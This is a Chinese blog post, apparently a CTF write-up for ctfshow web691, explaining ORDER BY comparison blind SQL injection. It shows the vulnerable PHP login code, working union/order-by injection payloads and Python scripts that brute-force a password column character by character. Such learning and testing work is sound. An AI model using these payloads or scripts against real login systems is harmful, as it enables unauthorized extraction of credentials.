
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/DSchenzi/p/18994172" title="发布于 2025-07-20 17:04">
    <span role="heading" aria-level="2">SQL order by 大小比较盲注</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="sql-order-by-大小比较盲注">SQL order by 大小比较盲注</h1>
<p>在做ctfshow web入门 的 web691时遇到了SQL order by 大小比较盲注问题。因为是第一次遇到，记录一下</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202507/3588329-20250720170340360-200492433.png" alt="image-20250720161316659" loading="lazy"></p>
<p>在做题之前，我们先来探讨一下order by 比较大小盲注</p>
<p>在本地先自己搭建一个数据库</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202507/3588329-20250720170340811-39894705.png" alt="image-20250720161457719" loading="lazy"></p>
<p>我们输入查询语句</p>
<pre><code class="language-mysql">SELECT * FROM `login` WHERE name=1 or 1 union SELECT 1,1,1 order by 3;
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202507/3588329-20250720170341130-2010543095.png" alt="image-20250720161541316" loading="lazy"></p>
<p>更换一下查询语句</p>
<pre><code class="language-mysql">SELECT * FROM `login` WHERE name=1 or 1 union SELECT 1,1,2 order by 3;
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202507/3588329-20250720170341359-1092908738.png" alt="image-20250720161642292" loading="lazy"></p>
<p>这里很明显就能看出，当用联合查询出来的passwd值1时，最终回显的是name=1而当我们输入passwd值为2时，最终回显的是name=admin即为第一条数据，并且在实际中我们不知道passwd的值，会回显一个密码错误，这样我们就可以根据回显一位一位来爆破password的值</p>
<pre><code class="language-python">s = '0123456789:abcdefghijklmnopqrstuvwxyz{'
password=''
for i in range(50):
    for j in s:
        payload=password+j
        data={
            'username':"'or 1 union select 1,1,'"+payload+"' order by 3#",
            'passwd':''
            }
        r=requests.post(url,data=data)
        if "wrong pass!" in r.text:
            password+=chr(ord(j)-1)
            print(password)
            break
</code></pre>
<p>回归到原题</p>
<pre><code class="language-php">&lt;?php
 
include('inc.php');
highlight_file(__FILE__);
error_reporting(0);
function   filter($str){
      $filterlist = "/\(|\)|username|password|where|
      case|when|like|regexp|into|limit|=|for|;/";
      if(preg_match($filterlist,strtolower($str))){
        die("illegal input!");
      }
      return $str;
  }
$username = isset($_POST['username'])?
filter($_POST['username']):die("please input username!");
$password = isset($_POST['password'])?
filter($_POST['password']):die("please input password!");
$sql = "select * from admin where  username =
 '$username' and password = '$password' ";

$res = $conn -&gt; query($sql);
if($res-&gt;num_rows&gt;0){
  $row = $res -&gt; fetch_assoc();
  if($row['id']){
     echo $row['username'];
  }
}else{
   echo "The content in the password column is the flag!";
}
?&gt;
</code></pre>
<p>首先我们先通过order by 来猜测有3个字段</p>
<pre><code class="language-mysql">#username=1' or 1 union select 1,1 order by 2#&amp;password=1
#回显"The content in the password column is the flag!"

username=1' or 1 union select 1,1,1 order by 3#&amp;password=1
</code></pre>
<p>3个字段大概率为id,username,password</p>
<pre><code class="language-mysql">username=1' or 1 union select 1,1,'c' order by 3#&amp;password=1
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202507/3588329-20250720170341620-1510387840.png" alt="image-20250720162728712" loading="lazy"></p>
<p>返回1,表明我们输入的<code>c</code>的ascill码还是小</p>
<pre><code class="language-mysql">username=1' or 1 union select 1,1,'d' order by 3#&amp;password=1
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202507/3588329-20250720170341918-1027623699.png" alt="image-20250720162807378" loading="lazy"></p>
<p>成功回显admin</p>
<p>但这里要注意的是我们最后获得真实值是要在回显admin时的ascii减1</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202507/3588329-20250720170342150-1529991335.png" alt="image-20250720162940826" loading="lazy"></p>
<p>如图，真实passwd的第一位是小1的</p>
<p>直接上脚本</p>
<pre><code class="language-python">import requests
s=".0123456789:abcdefghijklmnopqrstuvwxyz{|}~"
print(s)
url="http://29a1ba96-4095-4b96-adbb-56e359b5e690.challenge.ctf.show/"
data={
	'username':"or 1 union select 1,1,'{}' order by 3#",
	'password':'1'
}
k=""
for i in range(1,50):
	print(i)
	for j in s:
		data={
		'username':"' or 1 union select 1,1,'{0}' order by 3#".format(k+j),
		'password':'1'
	}
		r=requests.post(url,data=data)
		#print(data['username'])
		if("&lt;/code&gt;admin" in r.text):
			k=k+chr(ord(j)-1)
			print(k)
			break
</code></pre>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2025-07-20 17:04">2025-07-20 17:04</span>&nbsp;
<a href="https://www.cnblogs.com/DSchenzi">dynasty_chenzi</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18994172);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18994172', targetLink: 'https://www.cnblogs.com/DSchenzi/p/18994172', title: 'SQL order by 大小比较盲注' })">举报</a>
</div>
        